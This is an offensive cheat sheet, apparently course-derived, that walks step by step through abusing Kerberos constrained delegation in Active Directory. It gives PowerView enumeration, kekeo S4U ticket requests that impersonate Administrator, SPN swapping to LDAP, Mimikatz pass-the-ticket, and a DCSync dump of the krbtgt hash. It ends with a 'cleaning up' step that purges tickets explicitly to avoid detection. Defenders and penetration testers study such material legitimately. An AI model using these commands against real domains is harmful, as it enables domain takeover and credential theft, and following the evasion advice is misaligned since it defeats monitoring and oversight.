---
description: >-
  Dive into our comprehensive article exploring the intricacies of Constrained
  Delegation. Uncover its functions, role, and understanding its impact for an
  effective system management strategy.
---

# 🟢 Constrained Delegation

**Enumerate users with contrained delegation enabled**

```
Get-DomainUser -TrustedToAuth
Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
```

**Enumerate computers with contrained delegation enabled**

```
Get-Domaincomputer -TrustedToAuth
Get-Domaincomputer -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
```

### Constrained delegation User

**Requesting TGT with kekeo**

```
./kekeo.exe
Tgt::ask /user:<username> /domain:<domain> /rc4:<hash>
```

**Requesting TGS with kekeo**

{% code overflow="wrap" %}
```
Tgs::s4u /tgt:<tgt> /user:Administrator@<domain> /service:cifs/dcorp-mssql.dollarcorp.moneycorp.local
```
{% endcode %}

**Use Mimikatz to inject the TGS ticket**

```
Invoke-Mimikatz -Command '"kerberos::ptt <kirbi file>"'
```

### Constrained delegation Computer

**Requesting TGT with a PC hash**

```
./kekeo.exe
Tgt::ask /user:dcorp-adminsrv$ /domain:<domain> /rc4:<hash>
```

**Requesting TGS**

No validation for the SPN specified

{% code overflow="wrap" %}
```
Tgs::s4u /tgt:<kirbi file> /user:Administrator@<domain> /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL
```
{% endcode %}

### **Using mimikatz to inject TGS ticket and executing DCsync**

```
Invoke-Mimikatz -Command '"Kerberos::ptt <kirbi file>"'
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<shortdomain>\krbtgt"'
```

#### Additional Enumeration Techniques

Discover additional services allowing delegation:

```
Get-ADObject -Filter {msDS-AllowedToActOnBehalfOfOtherIdentity -ne '$null'} -Properties msDS-AllowedToActOnBehalfOfOtherIdentity

```

#### Further Exploitation

**Extract and Use TGT**

Using the extracted TGT for impersonation:

```
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
```

Then, using the ticket:

```
Invoke-Mimikatz -Command '"kerberos::ptt <path to .kirbi ticket>"'
```

**Execute Commands with the Impersonated Identity**

Once ticket is injected, use it to execute commands:

```
Invoke-Command -ScriptBlock { whoami; Get-Process } -Credential $cred -ComputerName
```

Where `$cred` is a PSCredential object created with the credentials of any user you've impersonated.

#### Cleaning Up

Remember to remove any traces of your activities:

```
Invoke-Mimikatz -Command '"kerberos::purge"'
```

This ensures the removal of all Kerberos tickets from the current session and helps avoid detection.

#### Additional Resources

For more information on Kerberos delegation and related attacks, refer to the following resources:

* [Microsoft Documentation on Kerberos Constrained Delegation](https://docs.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
* [Harmj0y's Guide to Kerberos Abuse](https://www.harmj0y.net/blog/tag/kerberos/)
